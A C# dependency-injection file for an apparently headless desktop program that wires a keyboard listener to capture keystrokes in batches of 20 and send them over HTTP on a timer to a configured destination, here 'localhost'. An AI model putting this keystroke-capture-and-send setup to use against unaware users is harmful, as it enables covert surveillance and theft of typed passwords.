using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using EMS.Core;
using EMS.Core.Interfaces;
using EMS.Core.Interfaces.Providers;
using EMS.Core.Providers;
using EMS.Infrastructure.Common.Configurations;
using EMS.Infrastructure.Common.Configurations.ListenersConfigs;
using EMS.Infrastructure.Common.Providers;
using EMS.Infrastructure.DependencyInjection;
using EMS.Infrastructure.DependencyInjection.Interfaces;

namespace EMS.Desktop.Headless
{
    public class DependenciesRegister
    {
        public IInjector RegisterDependencies(string jsonConfig)
        {

            var injector = UnityInjector.Instance;

            injector
                .Register<IWin32ApiProvider, Win32ApiProvider>()
                .RegisterInstance<KeyboardApiConfig>(new KeyboardApiConfig { SleepIntervalInMilliseconds = 15 })
                .Register<IKeyboardApi, KeyboardApi>(injector.Resolve<IWin32ApiProvider>(), injector.Resolve<KeyboardApiConfig>())
                .Register<IHttpClient, DefaultHttpClient>()
                .RegisterInstance<KeyboardListenerConfig>(new KeyboardListenerConfig
                {
                    CapturedKeysThreshold = 20,
                    DestinationUri = "localhost",
                    RetrySleepDurationsInMilliseconds = new List<int> { 1, 2, 3, 4, 5 },
                    SendCapturedKeysTimerConfig = new TimerConfig
                    {
                        DueTime = 5000,
                        Period = 2000
                    }
                })
                .Register<IListener, KeyboardListener>(nameof(KeyboardListener),injector.Resolve<IHttpClient>(), injector.Resolve<IKeyboardApi>(), injector.Resolve<KeyboardListenerConfig>());

            return injector;
        }
    }
}
